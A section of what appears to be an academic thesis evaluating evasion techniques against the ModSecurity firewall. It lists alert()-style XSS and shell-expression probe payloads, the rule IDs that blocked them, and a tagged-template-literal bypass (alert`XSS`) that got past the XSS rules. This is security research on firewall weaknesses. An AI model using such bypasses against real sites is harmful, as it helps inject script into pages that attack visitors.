\subsection{Single Iteration Evaluation}
This chapter states the evaluation results of a single iteration of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of blocked requests are referred to in attachment.


unicode tests:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>

<payload>encodeURIComponent('\u0024{`alert`}')</payload>
<payload>%24%7B%60alert%60%7D</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>
\end{lstlisting}


url encoding: the modsecurity firewall detects url encoding. when sending example requests in plain and urlencoded forms, the requests get blocked. (See Listing~\ref{lst:urlencodedexampleblocked})

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>alert(%60%24%7Bnew%20Date()%7D%60)</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}


\subsection{Tagged Template Literals}
As you can see in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server. (Listing~\ref{lst:alertXSSbypass}) 

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("XSS") blocked, label=lst:alertXSSblocked]
<payload>alert("XSS")</payload>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
<payload>alert("XSS")</payload>
<bypass>alert`XSS`</payload>
\end{lstlisting}
